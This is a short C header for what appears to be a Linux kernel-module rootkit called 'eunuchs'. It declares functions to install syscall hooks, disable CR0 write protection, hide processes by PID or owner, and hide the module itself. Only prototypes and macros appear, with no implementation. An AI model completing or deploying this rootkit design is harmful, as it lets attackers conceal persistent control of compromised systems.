#ifndef EUNUCHS_H
#define EUNUCHS_H

#define DEBUG 1
#define debug(fmt, ...) \
    if(DEBUG) \
    { \
        printk("[eunuchs] [%s] " fmt, __func__, ##__VA_ARGS__); \
    }

/* hide processes owned by this user by default */
#define EUNUCHS_PROC_HIDE_DEFAULT_USER "eunuchs"

/* for our char block device */
#define EUNUCHS_DEVICE_NAME "eunuchs"
#define EUNUCHS_CLASS_NAME "eunuchs"

static int eunuchs_init(void);
static void eunuchs_exit(void);
static int eunuchs_hooks_install(void);
static void eunuchs_hooks_remove(void);
static void cr0_enable_write(void);
static void cr0_disable_write(void);
static int eunuchs_dev_init(void);
static int eunuchs_dev_remove(void);
static int hide_proc_by_pid(char *);
static int show_proc_by_pid(char *);
static int eunuchs_lists_show_all(void);
static int eunuchs_hide_lkm(void);
static int eunuchs_show_lkm(void);

#endif
